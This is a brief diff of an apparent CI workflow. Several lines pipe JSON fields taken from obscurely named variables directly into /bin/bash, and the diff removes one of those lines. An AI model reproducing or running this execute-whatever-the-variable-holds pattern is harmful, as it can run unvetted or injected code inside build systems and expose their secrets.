@@ -35,7 +35,6 @@ jobs:
           printf '%s' "$w8906" | jq -r .xglw0802 | /bin/bash
           printf '%s' "$ya11" | jq -r .bhji0 | /bin/bash
           echo $wcl785 | jq -r .eo54 | /bin/bash
-          printf '%s' "$lljil16805" | jq -r .rdpql5391 | /bin/bash
           printf '%s' "$vimb493" | jq -r .ln12 | /bin/bash
 
       - name: Upload archive
